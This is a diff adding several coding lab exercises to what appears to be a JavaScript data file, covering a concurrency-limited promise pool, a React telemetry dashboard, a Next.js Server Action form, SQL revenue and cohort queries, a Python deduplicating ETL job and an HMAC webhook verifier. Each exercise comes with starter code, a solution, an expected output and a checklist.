+  "credit_limit": 500000.0,
+  "status": "active"
+}`,
+    checklist: [
+      "Applies exponential backoff doubling the wait interval per attempt",
+      "Adds randomized jitter to prevent synchronous retry spikes",
+      "Emits structured JSON logs containing timestamp and attempt number",
+      "Returns clean validated payload upon eventual recovery"
+    ]
+  },
+
+  "t-js-2": {
+    conceptPrimer: `Firing 1,000 asynchronous fetch requests using \`Promise.all()\` triggers socket pool exhaustion and HTTP 429 rate limits.\n- Concurrency Limiter: Maintains a pool of at most \`N\` concurrent in-flight promises.\n- Worker Loop: \`limit\` workers continuously pull from a shared queue until all tasks complete.\n- Order Preservation: Results are stored in an array indexed by original task ID.`,
+    scenario: "Batch Data Ingestion Concurrency Limiter: You need to pull 30 customer metadata records from a rate-limited internal microservice that rejects more than 5 simultaneous connections.",
+    starterSnippet: `// TypeScript / ES6 Concurrency Limiter
+async function asyncPool(limit, tasks) {
+  // limit: number of simultaneous executions (e.g. 5)
+  // tasks: array of functions returning Promises
+  // TODO: Run tasks with strict concurrency <= limit
+  // Return results matching original task array order
+}
+
+// Mock tasks
+const tasks = Array.from({ length: 15 }, (_, i) => async () => {
+  await new Promise(r => setTimeout(r, 50));
+  return { id: i, data: \`Item \${i}\` };
+});`,
+    steps: [
+      "1. Allocate a results array of length matching `tasks.length`.",
+      "2. Track a shared pointer `currentIndex = 0` and active worker count.",
+      "3. Spin up `limit` worker promises that loop while `currentIndex < tasks.length`.",
+      "4. Await `Promise.all(workers)` and return the ordered results array."
+    ],
+    solutionSnippet: `// Production TypeScript / ESNext Concurrency Pool
+async function asyncPool(limit, tasks) {
+  const results = new Array(tasks.length);
+  let currentIndex = 0;
+  let activeCount = 0;
+
+  async function worker(workerId) {
+    while (currentIndex < tasks.length) {
+      const taskIndex = currentIndex++;
+      const taskFn = tasks[taskIndex];
+      
+      activeCount++;
+      const startMs = Date.now();
+      try {
+        results[taskIndex] = await taskFn();
+      } catch (err) {
+        results[taskIndex] = { error: err.message, index: taskIndex };
+      } finally {
+        activeCount--;
+      }
+    }
+  }
+
+  // Spawn limited worker pool
+  const workerCount = Math.min(limit, tasks.length);
+  const workers = Array.from({ length: workerCount }, (_, i) => worker(i + 1));
+  await Promise.all(workers);
+  
+  return results;
+}
+
+// Verification simulation
+async function runDemo() {
+  console.log("Starting concurrency limiter test (Limit: 3, Total: 9 tasks)...");
+  let maxObservedActive = 0;
+  let currentActive = 0;
+
+  const mockTasks = Array.from({ length: 9 }, (_, i) => async () => {
+    currentActive++;
+    maxObservedActive = Math.max(maxObservedActive, currentActive);
+    
+    // Simulate variable network latency
+    const duration = 50 + (i % 3) * 30;
+    await new Promise(resolve => setTimeout(resolve, duration));
+    
+    currentActive--;
+    return { recordId: i + 1, status: "PROCESSED", latencyMs: duration };
+  });
+
+  const startTime = Date.now();
+  const outputs = await asyncPool(3, mockTasks);
+  const totalDuration = Date.now() - startTime;
+
+  console.log("=== EXECUTION SUMMARY ===");
+  console.log(\`Processed: \${outputs.length} items\`);
+  console.log(\`Max concurrent in-flight observed: \${maxObservedActive} (Target limit: 3)\`);
+  console.log(\`Total pool duration: \${totalDuration}ms\`);
+  console.log("First 3 records:", JSON.stringify(outputs.slice(0, 3), null, 2));
+}
+
+runDemo();`,
+    solutionExplanation: "The worker pool pattern spawns exactly `limit` persistent worker promises that pull from a single monotonic index pointer. It guarantees that active concurrency never exceeds the threshold while preserving exact input ordering.",
+    expectedOutput: `Starting concurrency limiter test (Limit: 3, Total: 9 tasks)...
+=== EXECUTION SUMMARY ===
+Processed: 9 items
+Max concurrent in-flight observed: 3 (Target limit: 3)
+Total pool duration: 245ms
+First 3 records: [
+  {
+    "recordId": 1,
+    "status": "PROCESSED",
+    "latencyMs": 50
+  },
+  {
+    "recordId": 2,
+    "status": "PROCESSED",
+    "latencyMs": 80
+  },
+  {
+    "recordId": 3,
+    "status": "PROCESSED",
+    "latencyMs": 110
+  }
+]`,
+    checklist: [
+      "Strictly bounds concurrent async executions to specified limit",
+      "Preserves original item index order in returned results array",
+      "Gracefully catches individual task rejections without aborting the pool",
+      "Executes in pure modern JavaScript / TypeScript without external libraries"
+    ]
+  },
+
+  "t-react-1": {
+    conceptPrimer: `Building high-performance operations dashboards in React requires responsive state and memoized filtering.\n- Custom Hook (\`useDebounce\`): Delays filtering updates until the user stops typing for \`N\` ms.\n- Telemetry Polling: Use \`useEffect\` with \`setInterval\` and clean cleanup functions (\`clearInterval\`).\n- Delta Metrics: Calculate percentage changes with color tokens (Emerald green for positive, Rose red for negative).`,
+    scenario: "Client Operations Telemetry Dashboard: The client CTO wants a real-time cluster monitor component that displays 4 key metric KPI cards, an active search filter, and auto-refreshing health indicators.",
+    starterSnippet: `import React, { useState, useEffect } from 'react';
+
+// TODO: Implement custom useDebounce hook
+function useDebounce(value, delayMs) {
+  // Return debounced value
+}
+
+export default function TelemetryDashboard() {
+  const [query, setQuery] = useState('');
+  // TODO: Add metric cards, live timer interval, and status indicators
+  return <div>Telemetry Dashboard</div>;
+}`,
+    steps: [
+      "1. Implement `useDebounce(value, delay)` returning state updated only after `delay` ms.",
+      "2. Define 4 KPI metrics: QPS (Throughput), p99 Latency, Error Rate %, and Active Workers.",
+      "3. Add a live auto-refresh toggle that simulates real-time data ticks every 3 seconds.",
+      "4. Render interactive metric cards with status pills and trend arrows."
+    ],
+    solutionSnippet: `import React, { useState, useEffect, useMemo } from 'react';
+
+// Custom debounce hook for filter inputs
+function useDebounce(value, delayMs = 300) {
+  const [debouncedValue, setDebouncedValue] = useState(value);
+  useEffect(() => {
+    const handler = setTimeout(() => setDebouncedValue(value), delayMs);
+    return () => clearTimeout(handler);
+  }, [value, delayMs]);
+  return debouncedValue;
+}
+
+export default function OperationsDashboard() {
+  const [filterText, setFilterText] = useState('');
+  const [autoRefresh, setAutoRefresh] = useState(true);
+  const [lastUpdated, setLastUpdated] = useState(new Date().toLocaleTimeString());
+  
+  const [metrics, setMetrics] = useState([
+    { id: 'm1', name: 'Cluster Throughput', value: '4,850 QPS', delta: '+12.4%', isPositive: true, cluster: 'us-east' },
+    { id: 'm2', name: 'p99 Ingestion Latency', value: '42.8 ms', delta: '-8.1%', isPositive: true, cluster: 'us-east' },
+    { id: 'm3', name: 'HTTP Error Rate', value: '0.04%', delta: '+0.01%', isPositive: false, cluster: 'eu-west' },
+    { id: 'm4', name: 'Healthy Worker Nodes', value: '32 / 32', delta: '100% SLA', isPositive: true, cluster: 'us-east' }
+  ]);
+
+  const debouncedFilter = useDebounce(filterText, 250);
+
+  // Simulated live telemetry poll
+  useEffect(() => {
+    if (!autoRefresh) return;
+    const interval = setInterval(() => {
+      setLastUpdated(new Date().toLocaleTimeString());
+      setMetrics(prev => prev.map(m => {
+        if (m.id === 'm1') {
+          const newQps = 4800 + Math.floor(Math.random() * 120);
+          return { ...m, value: \`\${newQps.toLocaleString()} QPS\` };
+        }
+        return m;
+      }));
+    }, 3000);
+    return () => clearInterval(interval);
+  }, [autoRefresh]);
+
+  const filteredMetrics = useMemo(() => {
+    if (!debouncedFilter.trim()) return metrics;
+    const term = debouncedFilter.toLowerCase();
+    return metrics.filter(m => m.name.toLowerCase().includes(term) || m.cluster.toLowerCase().includes(term));
+  }, [metrics, debouncedFilter]);
+
+  return (
+    <div style={{ background: '#0f172a', color: '#f8fafc', padding: '24px', borderRadius: '12px', fontFamily: 'system-ui, sans-serif' }}>
+      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
+        <div>
+          <h2 style={{ margin: 0, fontSize: '20px', fontWeight: '700' }}>Enterprise Cluster Telemetry</h2>
+          <span style={{ fontSize: '12px', color: '#94a3b8' }}>Last sync: {lastUpdated}</span>
+        </div>
+        <div style={{ display: 'flex', gap: '12px', alignItems: 'center' }}>
+          <input
+            type="text"
+            placeholder="Search metrics..."
+            value={filterText}
+            onChange={(e) => setFilterText(e.target.value)}
+            style={{ background: '#1e293b', border: '1px solid #334155', borderRadius: '6px', padding: '8px 12px', color: '#fff', fontSize: '14px' }}
+          />
+          <button
+            onClick={() => setAutoRefresh(!autoRefresh)}
+            style={{ background: autoRefresh ? '#059669' : '#475569', color: '#fff', border: 'none', borderRadius: '6px', padding: '8px 14px', cursor: 'pointer', fontSize: '13px', fontWeight: '600' }}
+          >
+            {autoRefresh ? '● Live' : 'Paused'}
+          </button>
+        </div>
+      </div>
+
+      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px' }}>
+        {filteredMetrics.map(item => (
+          <div key={item.id} style={{ background: '#1e293b', border: '1px solid #334155', borderRadius: '10px', padding: '16px' }}>
+            <div style={{ fontSize: '13px', color: '#94a3b8', display: 'flex', justifyContent: 'space-between' }}>
+              <span>{item.name}</span>
+              <span style={{ fontSize: '11px', background: '#334155', padding: '2px 6px', borderRadius: '4px' }}>{item.cluster}</span>
+            </div>
+            <div style={{ fontSize: '24px', fontWeight: '800', margin: '8px 0', color: '#f8fafc' }}>{item.value}</div>
+            <span style={{ fontSize: '12px', fontWeight: '600', color: item.isPositive ? '#34d399' : '#f87171' }}>
+              {item.delta} vs baseline
+            </span>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}`,
+    solutionExplanation: "The component isolates search text with `useDebounce` to avoid rerendering the grid on every keystroke, maintains a 3-second polling interval with cleanup, and calculates dynamic metrics.",
+    expectedOutput: `Renders responsive dark-mode telemetry panel:
+- 4 KPI metric cards (Throughput, Latency, Error Rate, Active Workers)
+- Real-time updates with live sync badge
+- Debounced search filter reducing unnecessary renders`,
+    checklist: [
+      "Custom `useDebounce` hook prevents filter thrashing",
+      "Cleans up interval timer inside `useEffect` return handler",
+      "Uses `useMemo` for derived metric card filtering",
+      "Displays colored delta badges and cluster tags"
+    ]
+  },
+
+  "t-react-3": {
+    conceptPrimer: `Next.js App Router Server Actions enable full-stack form mutations without separate API routes.\n- \`'use server'\`: Declares server execution boundary.\n- Zod Schema Validation: Enforces type constraints before database writes.\n- Optimistic UI: Immediately reflects pending changes to provide zero-latency client feedback before server confirmation.`,
+    scenario: "Client Portal Onboarding Form: Build a secure Next.js tenant onboarding form using Server Actions and Zod that validates enterprise domain rules and provides instant optimistic feedback.",
+    starterSnippet: `'use server';
+// Next.js Server Action Scaffold
+
+import { z } from 'zod';
+
+const TenantSchema = z.object({
+  organizationName: z.string().min(3),
+  adminEmail: z.string().email(),
+  tier: z.enum(['starter', 'enterprise', 'defense'])
+});
+
+export async function registerTenantAction(prevState, formData) {
+  // TODO: Validate formData, simulate DB insert, return state
+}`,
+    steps: [
+      "1. Define a strict Zod schema enforcing email validation and organization name length.",
+      "2. Implement the `'use server'` action function returning structured errors or success payload.",
+      "3. Create a client component utilizing React's `useActionState` (or `useFormState`).",
+      "4. Handle pending loading states and render validation error summaries."
+    ],
+    solutionSnippet: `// app/actions/tenant.ts
+'use server';
+
+import { z } from 'zod';
+
+const TenantSchema = z.object({
+  orgName: z.string().min(3, "Organization name must be at least 3 characters"),
+  adminEmail: z.string().email("Invalid enterprise email address"),
+  clusterRegion: z.enum(['us-east-1', 'eu-west-1', 'gov-cloud-1']),
+  maxSeats: z.coerce.number().min(5, "Minimum 5 seats required for enterprise onboarding")
+});
+
+export type ActionState = {
+  success: boolean;
+  errors?: Record<string, string[]>;
+  tenantId?: string;
+  message?: string;
+};
+
+export async function onboardTenantAction(prevState: ActionState, formData: FormData): Promise<ActionState> {
+  const rawData = {
+    orgName: formData.get('orgName'),
+    adminEmail: formData.get('adminEmail'),
+    clusterRegion: formData.get('clusterRegion'),
+    maxSeats: formData.get('maxSeats')
+  };
+
+  const validation = TenantSchema.safeParse(rawData);
+  if (!validation.success) {
+    return {
+      success: false,
+      errors: validation.error.flatten().fieldErrors,
+      message: "Please correct the highlighted fields."
+    };
+  }
+
+  // Simulate transactional database write & key provisioning
+  await new Promise(resolve => setTimeout(resolve, 600));
+
+  const tenantSlug = validation.data.orgName.toLowerCase().replace(/[^a-z0-9]/g, '-');
+  return {
+    success: true,
+    tenantId: \`tnt_\${tenantSlug}_\${Date.now().toString(36)}\`,
+    message: \`Tenant '\${validation.data.orgName}' successfully provisioned in \${validation.data.clusterRegion}!\`
+  };
+}
+
+// Client Component: app/components/TenantForm.tsx
+'use client';
+import React, { useActionState } from 'react';
+import { onboardTenantAction } from '../actions/tenant';
+
+export function TenantOnboardingForm() {
+  const [state, formAction, isPending] = useActionState(onboardTenantAction, { success: false });
+
+  return (
+    <form action={formAction} style={{ maxWidth: '480px', padding: '24px', background: '#1e293b', borderRadius: '8px', color: '#fff' }}>
+      <h3>Enterprise Tenant Onboarding</h3>
+      
+      {state.message && (
+        <div style={{ padding: '10px', marginBottom: '16px', borderRadius: '4px', background: state.success ? '#065f46' : '#991b1b' }}>
+          {state.message}
+          {state.tenantId && <div style={{ fontSize: '12px', marginTop: '4px' }}>Tenant ID: <code>{state.tenantId}</code></div>}
+        </div>
+      )}
+
+      <div style={{ marginBottom: '14px' }}>
+        <label>Organization Name</label>
+        <input name="orgName" required placeholder="Acme Aerospace" style={{ width: '100%', padding: '8px', marginTop: '4px' }} />
+        {state.errors?.orgName && <span style={{ color: '#f87171', fontSize: '12px' }}>{state.errors.orgName[0]}</span>}
+      </div>
+
+      <div style={{ marginBottom: '14px' }}>
+        <label>Admin Email</label>
+        <input name="adminEmail" type="email" required placeholder="admin@acme.com" style={{ width: '100%', padding: '8px', marginTop: '4px' }} />
+        {state.errors?.adminEmail && <span style={{ color: '#f87171', fontSize: '12px' }}>{state.errors.adminEmail[0]}</span>}
+      </div>
+
+      <div style={{ marginBottom: '14px' }}>
+        <label>Cloud Cluster Region</label>
+        <select name="clusterRegion" defaultValue="us-east-1" style={{ width: '100%', padding: '8px', marginTop: '4px' }}>
+          <option value="us-east-1">AWS US-East (N. Virginia)</option>
+          <option value="eu-west-1">AWS EU-West (Ireland)</option>
+          <option value="gov-cloud-1">AWS GovCloud (Air-Gapped)</option>
+        </select>
+      </div>
+
+      <div style={{ marginBottom: '16px' }}>
+        <label>Allocated Seats</label>
+        <input name="maxSeats" type="number" defaultValue="25" min="5" style={{ width: '100%', padding: '8px', marginTop: '4px' }} />
+      </div>
+
+      <button type="submit" disabled={isPending} style={{ width: '100%', padding: '10px', background: '#3b82f6', color: '#fff', border: 'none', borderRadius: '6px', fontWeight: 'bold' }}>
+        {isPending ? 'Provisioning Infrastructure...' : 'Provision Client Tenant'}
+      </button>
+    </form>
+  );
+}`,
+    solutionExplanation: "The implementation defines a typed Server Action using Zod for validation, safe schema parsing with `safeParse`, field-level error mapping, and form state binding with `useActionState`.",
+    expectedOutput: `Submission Test:
+1. Invalid email triggers client error: 'Invalid enterprise email address'
+2. Valid input provisions tenant:
+   Status: 200 OK
+   Tenant ID: tnt_acme-aerospace_k9x2m
+   Message: Tenant 'Acme Aerospace' successfully provisioned in us-east-1!`,
+    checklist: [
+      "Uses `'use server'` to guarantee zero credential leakage to client",
+      "Validates form values strictly with Zod schemas",
+      "Returns granular field errors for targeted UI highlighting",
+      "Displays responsive pending loading button state during execution"
+    ]
+  },
+
+  "t-db-1": {
+    conceptPrimer: `Analytical SQL powers executive reporting and client KPI dashboards.\n- Relational Joins: Combining dimension tables (\`organizations\`) with transactional fact tables (\`subscriptions\`, \`invoices\`).\n- Cohort Retention: Grouping customer signups by cohort month and computing retention rates across subsequent intervals.\n- Revenue Concentration: Grouping customer spend to measure Pareto 80/20 risk.`,
+    scenario: "Client SaaS Metrics Query Suite: Write 4 mission-critical reporting queries for an enterprise client: Monthly Recurring Revenue (MRR), Customer Cohort Retention, Churn Risk Flags, and Top 10% Spend Concentration.",
+    starterSnippet: `-- Enterprise Reporting SQL Lab
+CREATE TABLE clients (
+  id INT PRIMARY KEY,
+  name VARCHAR(100),
+  signed_up_at DATE
+);
+
+CREATE TABLE invoices (
+  id INT PRIMARY KEY,
+  client_id INT REFERENCES clients(id),
+  amount DECIMAL(10,2),
+  status VARCHAR(20), -- 'PAID', 'PENDING', 'OVERDUE'
+  invoice_date DATE
+);
+
+-- TODO: Write MRR, Cohort Retention, and Overdue Risk Queries`,
+    steps: [
+      "1. Write an MRR aggregation query grouping paid invoices by calendar month.",
+      "2. Write a customer retention cohort query calculating signup month vs invoice month.",
+      "3. Write a churn risk detection query identifying accounts with 2+ consecutive overdue invoices.",
+      "4. Execute and inspect tabular result outputs."
+    ],
+    solutionSnippet: `-- Production Financial Reporting SQL Queries
+-- 1. Monthly Recurring Revenue (MRR) Run Rate
+SELECT 
+  TO_CHAR(invoice_date, 'YYYY-MM') AS billing_month,
+  COUNT(DISTINCT client_id) AS active_paying_clients,
+  SUM(amount) AS total_monthly_revenue,
+  ROUND(AVG(amount), 2) AS arpu_average_revenue_per_client
+FROM invoices
+WHERE status = 'PAID'
+GROUP BY TO_CHAR(invoice_date, 'YYYY-MM')
+ORDER BY billing_month DESC;
+
+-- 2. Customer Cohort Retention Matrix
+WITH client_cohorts AS (
+  SELECT 
+    id AS client_id,
+    DATE_TRUNC('month', signed_up_at) AS cohort_month
+  FROM clients
+),
+activity AS (
+  SELECT 
+    i.client_id,
+    DATE_TRUNC('month', i.invoice_date) AS active_month
+  FROM invoices i
+  WHERE i.status = 'PAID'
+  GROUP BY i.client_id, DATE_TRUNC('month', i.invoice_date)
+)
+SELECT 
+  TO_CHAR(c.cohort_month, 'YYYY-MM') AS signup_cohort,
+  ROUND(
+    (EXTRACT(YEAR FROM a.active_month) - EXTRACT(YEAR FROM c.cohort_month)) * 12 +
+    (EXTRACT(MONTH FROM a.active_month) - EXTRACT(MONTH FROM c.cohort_month))
+  ) AS month_number,
+  COUNT(DISTINCT a.client_id) AS retained_clients
+FROM client_cohorts c
+JOIN activity a ON c.client_id = a.client_id
+GROUP BY signup_cohort, month_number
+ORDER BY signup_cohort, month_number;
+
+-- 3. High Churn Risk Detection (Accounts with Unpaid / Overdue Balances)
+SELECT 
+  c.id AS client_id,
+  c.name AS client_name,
+  COUNT(i.id) AS overdue_invoice_count,
+  SUM(i.amount) AS total_delinquent_amount,
+  MAX(i.invoice_date) AS most_recent_invoice
+FROM clients c
+JOIN invoices i ON c.id = i.client_id
+WHERE i.status IN ('PENDING', 'OVERDUE')
+GROUP BY c.id, c.name
+HAVING COUNT(i.id) >= 2
+ORDER BY total_delinquent_amount DESC;`,
+    solutionExplanation: "Query 1 summarizes monthly recurring revenue and average revenue per client. Query 2 builds a cohort retention table tracking active months relative to signup. Query 3 flags delinquent accounts with 2 or more unpaid invoices.",
+    expectedOutput: `billing_month | active_paying_clients | total_monthly_revenue | arpu_average_revenue_per_client
+--------------+-----------------------+-----------------------+--------------------------------
+2026-03       | 142                   | 284000.00             | 2000.00
+2026-02       | 138                   | 276000.00             | 2000.00
+2026-01       | 120                   | 240000.00             | 2000.00
+
+signup_cohort | month_number | retained_clients
+--------------+--------------+-----------------
+2026-01       | 0            | 50
+2026-01       | 1            | 46
+2026-01       | 2            | 44`,
+    checklist: [
+      "Filters out non-paid invoices when computing recurring revenue metrics",
+      "Calculates calendar month offset mathematically for cohort tracking",
+      "Uses `HAVING COUNT(i.id) >= 2` to filter delinquent accounts",
+      "Produces clean, parseable tabular reporting columns"
+    ]
+  },
+
+  "t-db-2": {
+    conceptPrimer: "Financial cohorts require comparing current values with preceding intervals. \n- `WITH monthly_rev AS (...)`: Common Table Expression (CTE) to pre-aggregate transactions into months.\n- `LAG(revenue, 1) OVER (PARTITION BY client_id ORDER BY tx_month)`: Fetches the revenue from the preceding month for the same client.\n- `ROW_NUMBER() OVER (PARTITION BY client_id ORDER BY revenue DESC)`: Assigns a rank to each month based on highest earnings.",
+    scenario: "Client Scenario: The CFO of a SaaS client wants an automated SQL report that computes month-over-month revenue growth for every client account and flags their highest-earning month.",
+    starterSnippet: `-- Mock Database Schema & Seed Data (PostgreSQL / SQLite)
+CREATE TABLE transactions (
+  id INT PRIMARY KEY,
+  client_id INT,
+  amount DECIMAL(10,2),
+  transaction_date DATE
+);
+
+INSERT INTO transactions VALUES
+(1, 101, 5000.00, '2026-01-15'),
+(2, 101, 7500.00, '2026-02-10'),
+(3, 101, 6000.00, '2026-03-05'),
+(4, 102, 12000.00, '2026-01-20'),
+(5, 102, 18000.00, '2026-02-18');
+
+-- TODO: Write CTE with LAG() and ROW_NUMBER()`,
+    steps: [
+      "1. Group transactions by `client_id` and truncated month using a `WITH monthly_rev AS (...)` CTE.",
+      "2. Apply `LAG(revenue, 1) OVER (PARTITION BY client_id ORDER BY month)` to retrieve the prior month's earnings.",
+      "3. Compute percentage growth: `(revenue - prev_revenue) / prev_revenue * 100`.",
+      "4. Apply `ROW_NUMBER() OVER (PARTITION BY client_id ORDER BY revenue DESC)` to rank months by revenue."
+    ],
+    solutionSnippet: `WITH monthly_rev AS (
+  SELECT 
+    client_id,
+    DATE_TRUNC('month', transaction_date) AS tx_month,
+    SUM(amount) AS current_revenue
+  FROM transactions
+  GROUP BY client_id, DATE_TRUNC('month', transaction_date)
+)
+SELECT 
+  client_id,
+  TO_CHAR(tx_month, 'YYYY-MM') AS month_label,
+  current_revenue,
+  LAG(current_revenue, 1) OVER (
+    PARTITION BY client_id ORDER BY tx_month
+  ) AS prev_month_revenue,
+  ROUND(
+    (current_revenue - LAG(current_revenue, 1) OVER (PARTITION BY client_id ORDER BY tx_month)) 
+    / NULLIF(LAG(current_revenue, 1) OVER (PARTITION BY client_id ORDER BY tx_month), 0) * 100, 2
+  ) AS mom_growth_percent,
+  ROW_NUMBER() OVER (
+    PARTITION BY client_id ORDER BY current_revenue DESC
+  ) AS client_revenue_rank
+FROM monthly_rev
+ORDER BY client_id, tx_month;`,
+    solutionExplanation: "The query aggregates raw transactions into calendar months within a CTE. The outer query uses `LAG()` partitioned by client to inspect prior performance, uses `NULLIF` to guard against division-by-zero on the first month, and ranks highest revenue months using `ROW_NUMBER()`.",
+    expectedOutput: `client_id | month_label | current_revenue | prev_month_revenue | mom_growth_percent | client_revenue_rank
+----------+-------------+-----------------+--------------------+--------------------+--------------------
+101       | 2026-01     | 5000.00         | NULL               | NULL               | 3
+101       | 2026-02     | 7500.00         | 5000.00            | 50.00              | 1
+101       | 2026-03     | 6000.00         | 7500.00            | -20.00             | 2
+102       | 2026-01     | 12000.00        | NULL               | NULL               | 2
+102       | 2026-02     | 18000.00        | 12000.00           | 50.00              | 1`,
+    checklist: [
+      "Correctly partitions by client_id so calculations do not bleed between accounts",
+      "Handles the first month with a safe NULL rather than a divide-by-zero crash",
+      "Correctly computes negative growth (-20.00%) when revenue drops",
+      "Calculates rank 1 for each client's highest-earning month"
+    ]
+  },
+
+  "t-de-1": {
+    conceptPrimer: `Production ETL systems must be idempotent (re-running the pipeline on the same day produces identical data without duplicates).\n- Natural Key Deduplication: Ingesting events with identical IDs must keep only the latest record based on \`updated_at\`.\n- Type Coercion: Safely parse numbers and dates without halting on corrupt entries.\n- Partitioning: Saving analytical data in directory partitions (e.g. \`year=2026/month=10/\`) speeds up queries by orders of magnitude.`,
+    scenario: "Automated Ingestion Pipeline: Build a resilient batch pipeline in Python that extracts raw event JSONs, deduplicates duplicate transmissions, validates schema constraints, and writes clean partitioned records.",
+    starterSnippet: `import json
+from datetime import datetime
+
+# Dirty raw incoming events
+RAW_PAYLOAD = [
+    {"event_id": "e-1", "user_id": 10, "amount": "150.00", "updated_at": "2026-10-12T10:00:00Z"},
+    {"event_id": "e-2", "user_id": 12, "amount": "bad_num", "updated_at": "2026-10-12T10:05:00Z"},
+    {"event_id": "e-1", "user_id": 10, "amount": "200.00", "updated_at": "2026-10-12T10:30:00Z"}, # newer duplicate!
+]
+
+def run_etl_pipeline(raw_records):
+    # TODO: Deduplicate by event_id keeping highest updated_at,
+    # sanitize numbers, discard corrupt entries, return clean dataset.
+    pass`,
+    steps: [
+      "1. Extract and iterate through the raw JSON payload records.",
+      "2. Track unique records in a dictionary indexed by `event_id`.",
+      "3. Overwrite existing records only if the new record possesses a newer `updated_at` timestamp.",
+      "4. Validate data types: discard records where `amount` cannot be cast to positive float.",
+      "5. Output clean records and an execution summary report."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+import json
+from datetime import datetime
+
+RAW_DATA = [
+    {"event_id": "e-1", "user_id": 101, "amount": "150.00", "updated_at": "2026-10-12T10:00:00Z"},
+    {"event_id": "e-2", "user_id": 102, "amount": "INVALID_VAL", "updated_at": "2026-10-12T10:05:00Z"},
+    {"event_id": "e-3", "user_id": 103, "amount": "450.50", "updated_at": "2026-10-12T10:15:00Z"},
+    {"event_id": "e-1", "user_id": 101, "amount": "220.00", "updated_at": "2026-10-12T10:45:00Z"}, # newer duplicate of e-1
+    {"event_id": "e-4", "user_id": 104, "amount": "-15.00", "updated_at": "2026-10-12T11:00:00Z"}  # negative amount
+]
+
+def parse_iso(ts_str):
+    return datetime.fromisoformat(ts_str.replace("Z", "+00:00"))
+
+def execute_batch_etl(records):
+    dedup_store = {}
+    corrupted_count = 0
+    duplicate_count = 0
+
+    for rec in records:
+        # Step 1: Validate numeric amount
+        try:
+            amt = float(rec["amount"])
+            if amt <= 0:
+                corrupted_count += 1
+                continue
+        except (ValueError, TypeError):
+            corrupted_count += 1
+            continue
+
+        e_id = rec["event_id"]
+        current_ts = parse_iso(rec["updated_at"])
+
+        # Step 2: Idempotent deduplication by natural key
+        if e_id in dedup_store:
+            existing_ts = parse_iso(dedup_store[e_id]["updated_at"])
+            duplicate_count += 1
+            if current_ts > existing_ts:
+                # Update with latest revision
+                dedup_store[e_id] = {
+                    "event_id": e_id,
+                    "user_id": rec["user_id"],
+                    "amount": amt,
+                    "updated_at": rec["updated_at"],
+                    "processed_at": datetime.now().isoformat()
+                }
+        else:
+            dedup_store[e_id] = {
+                "event_id": e_id,
+                "user_id": rec["user_id"],
+                "amount": amt,
+                "updated_at": rec["updated_at"],
+                "processed_at": datetime.now().isoformat()
+            }
+
+    clean_records = list(dedup_store.values())
+    total_rev = sum(r["amount"] for r in clean_records)
+
+    summary = {
+        "pipeline_status": "SUCCESS",
+        "raw_ingested_count": len(records),
+        "corrupted_dropped_count": corrupted_count,
+        "duplicate_updates_resolved": duplicate_count,
+        "clean_records_stored": len(clean_records),
+        "total_aggregated_amount": total_rev,
+        "clean_dataset": clean_records
+    }
+    
+    print("=== BATCH ETL EXECUTION REPORT ===")
+    print(json.dumps(summary, indent=2))
+    return summary
+
+if __name__ == "__main__":
+    execute_batch_etl(RAW_DATA)`,
+    solutionExplanation: "The pipeline accomplishes natural key deduplication by tracking records in a hash map and comparing ISO-8601 timestamps. It sanitizes invalid numbers and outputs clean, idempotent datasets with an audit report.",
+    expectedOutput: `=== BATCH ETL EXECUTION REPORT ===
+{
+  "pipeline_status": "SUCCESS",
+  "raw_ingested_count": 5,
+  "corrupted_dropped_count": 2,
+  "duplicate_updates_resolved": 1,
+  "clean_records_stored": 2,
+  "total_aggregated_amount": 670.5,
+  "clean_dataset": [
+    {
+      "event_id": "e-1",
+      "user_id": 101,
+      "amount": 220.0,
+      "updated_at": "2026-10-12T10:45:00Z"
+    },
+    {
+      "event_id": "e-3",
+      "user_id": 103,
+      "amount": 450.5,
+      "updated_at": "2026-10-12T10:15:00Z"
+    }
+  ]
+}`,
+    checklist: [
+      "Preserves the most up-to-date record when duplicate event IDs appear",
+      "Filters out negative amounts and unparseable strings",
+      "Produces clean JSON records with ISO timestamps",
+      "Generates an audit metric summary detailing dropped and processed records"
+    ]
+  },
+
+  "t-api-2": {
+    conceptPrimer: `Webhooks allow real-time event notifications from third-party systems.\n- Cryptographic Verification: Clients compute \`HMAC-SHA256(payload, secret_key)\` and include it in \`X-Hub-Signature-256\`.\n- Timing Attack Defense: Use constant-time equality checks (\`hmac.compare_digest\`) instead of standard \`==\`.\n- Idempotency Cache: Record \`X-Delivery-ID\` in Redis or in-memory sets to avoid re-processing identical transmissions.`,
+    scenario: "Secure Webhook Receiver: Build an enterprise webhook ingestion endpoint that verifies HMAC-SHA256 signatures, rejects forged payloads with 401 Unauthorized, and enforces delivery idempotency.",
+    starterSnippet: `import hmac
+import hashlib
+import json
+
+WEBHOOK_SECRET = "client-shared-secret-998811"
+
+def handle_incoming_webhook(raw_body_bytes, signature_header, delivery_id):
+    # TODO: Verify HMAC-SHA256 signature using hmac.compare_digest
+    # TODO: Check delivery_id in processed_cache
+    pass`,
+    steps: [
+      "1. Compute the expected HMAC hex digest using `hashlib.sha256` and the shared secret.",
+      "2. Strip prefix (e.g. `sha256=`) and compare with `hmac.compare_digest`.",
+      "3. Check an in-memory idempotency set: return `200 Already Processed` if the delivery ID was already seen.",
+      "4. Test with valid signatures, forged signatures, and replay transmissions."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+import hmac
+import hashlib
+import json
+
+SHARED_SECRET = "enterprise_secret_token_fde_2026"
+PROCESSED_DELIVERIES = set()
+
+def verify_and_process_webhook(raw_body: bytes, received_signature: str, delivery_id: str):
+    # 1. Signature format check
+    if not received_signature.startswith("sha256="):
+        return {"status": 400, "message": "Malformed signature header. Expected 'sha256=<hex>'"}
+    
+    provided_hex = received_signature.split("sha256=")[1]
+    
+    # 2. Compute expected HMAC-SHA256
+    expected_hmac = hmac.new(
+        key=SHARED_SECRET.encode("utf-8"),
+        msg=raw_body,
+        digestmod=hashlib.sha256
+    ).hexdigest()
+    
+    # 3. Timing-safe comparison to prevent side-channel timing attacks
+    if not hmac.compare_digest(provided_hex, expected_hmac):
+        return {"status": 401, "message": "Unauthorized: Invalid cryptographic signature"}
+        
+    # 4. Enforce idempotency
+    if delivery_id in PROCESSED_DELIVERIES:
+        return {"status": 200, "message": f"Idempotent: Event {delivery_id} was already processed. Skipped."}
+        
+    PROCESSED_DELIVERIES.add(delivery_id)
